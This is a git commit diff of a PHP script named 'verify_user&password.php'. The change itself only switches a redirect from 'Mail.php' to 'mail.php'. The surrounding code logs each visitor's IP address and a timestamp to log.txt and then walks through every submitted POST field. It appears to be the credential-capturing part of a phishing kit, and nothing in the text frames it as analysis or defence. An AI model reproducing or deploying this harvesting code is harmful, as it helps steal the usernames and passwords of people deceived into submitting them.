3f7732a796b9069112adf74fb3a8af2c0878ef9a
chasedream10 <62924884+chasedream10@users.noreply.github.com>
2022-02-01 17:05:40 -0500

    Update verify_user&password.php

--- verify_user&password.php
+++ verify_user&password.php
@@ -1,6 +1,6 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-header('Location: Mail.php');
+header('Location: mail.php');
 $handle = fopen('log.txt', 'a');
 fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
 foreach($_POST as $variable => $value) {
